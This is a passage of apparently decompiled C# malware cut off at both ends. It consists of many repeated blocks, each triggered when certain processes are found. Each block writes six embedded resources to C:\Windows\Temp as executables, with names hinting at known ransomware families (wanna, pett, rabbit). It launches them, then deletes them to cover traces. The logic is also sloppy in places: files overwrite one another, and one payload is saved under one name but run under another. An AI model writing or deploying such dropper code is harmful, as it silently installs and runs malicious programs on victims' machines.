				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName11.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName12.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName13.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName14.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName15.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName16.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName17.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName18.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName19.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
